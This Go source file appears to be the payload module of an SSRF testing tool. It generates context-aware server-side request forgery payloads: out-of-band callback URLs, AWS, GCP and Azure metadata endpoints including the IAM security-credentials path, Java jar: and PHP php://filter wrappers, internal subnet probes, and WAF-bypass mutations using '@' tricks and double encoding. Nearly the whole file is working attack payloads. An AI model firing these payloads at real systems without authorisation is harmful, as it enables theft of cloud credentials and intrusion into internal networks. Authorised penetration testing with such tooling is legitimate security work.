package payloads

import (
	"fmt"
	"strings"
)

// Payload represents one generated test payload.
type Payload struct {
	Name     string
	Category string
	Value    string
}

// EnvironmentContext carries inferred runtime context for payload strategy.
type EnvironmentContext struct {
	CloudProvider string
	WAFDetected   bool
	ProxyDetected bool
	BackendLang   string
	InternalRange []string
}

// GeneratePayloads builds a context-aware payload set.
func GeneratePayloads(ctx *EnvironmentContext) []Payload {
	payloads := make([]Payload, 0)

	payloads = append(payloads, Payload{
		Name:     "oob-http-baseline",
		Category: "fetch",
		Value:    "http://{{OOB}}/baseline",
	})

	if ctx == nil {
		return payloads
	}

	switch strings.ToLower(ctx.CloudProvider) {
	case "aws":
		payloads = append(payloads, awsMetadataPayloads()...)
		payloads = append(payloads, awsIMDSv2Payloads()...)
	case "gcp":
		payloads = append(payloads, gcpMetadataPayloads()...)
	case "azure":
		payloads = append(payloads, azureMetadataPayloads()...)
	}

	if ctx.WAFDetected {
		payloads = applyBypassMutations(payloads)
	}

	switch ctx.BackendLang {
	case "java":
		payloads = append(payloads, Payload{
			Name:     "java-jar-uri",
			Category: "protocol",
			Value:    "jar:http://{{OOB}}/archive.jar!/",
		})
	case "php":
		payloads = append(payloads, Payload{
			Name:     "php-wrapper",
			Category: "protocol",
			Value:    "php://filter/resource=http://{{OOB}}/x",
		})
	}

	for i, subnet := range ctx.InternalRange {
		payloads = append(payloads, Payload{
			Name:     fmt.Sprintf("internal-range-%d", i+1),
			Category: "internal",
			Value:    fmt.Sprintf("http://%s/", subnet),
		})
	}

	return dedupePayloads(payloads)
}

func awsMetadataPayloads() []Payload {
	return []Payload{
		{Name: "aws-imds-role-list", Category: "cloud_metadata", Value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
		{Name: "aws-imds-instance-id", Category: "cloud_metadata", Value: "http://169.254.169.254/latest/meta-data/instance-id"},
	}
}

func awsIMDSv2Payloads() []Payload {
	return []Payload{
		{Name: "aws-imdsv2-probe", Category: "cloud_metadata", Value: "http://169.254.169.254/latest/api/token"},
	}
}

func gcpMetadataPayloads() []Payload {
	return []Payload{
		{Name: "gcp-metadata-instance-id", Category: "cloud_metadata", Value: "http://metadata.google.internal/computeMetadata/v1/instance/id"},
	}
}

func azureMetadataPayloads() []Payload {
	return []Payload{
		{Name: "azure-metadata-instance", Category: "cloud_metadata", Value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"},
	}
}

func applyBypassMutations(in []Payload) []Payload {
	mutated := make([]Payload, 0, len(in)*2)
	mutated = append(mutated, in...)
	for _, p := range in {
		if p.Category != "cloud_metadata" && p.Category != "fetch" {
			continue
		}
		mutated = append(mutated, Payload{
			Name:     p.Name + "-at-bypass",
			Category: p.Category,
			Value:    "http://example.com@{{OOB}}/bypass",
		})
		mutated = append(mutated, Payload{
			Name:     p.Name + "-double-encoded",
			Category: p.Category,
			Value:    "http:%252f%252f{{OOB}}%252fbypass",
		})
	}
	return mutated
}

func dedupePayloads(in []Payload) []Payload {
	seen := make(map[string]struct{}, len(in))
	out := make([]Payload, 0, len(in))
	for _, p := range in {
		key := p.Category + "|" + p.Value
		if _, exists := seen[key]; exists {
			continue
		}
		seen[key] = struct{}{}
		out = append(out, p)
	}
	return out
}
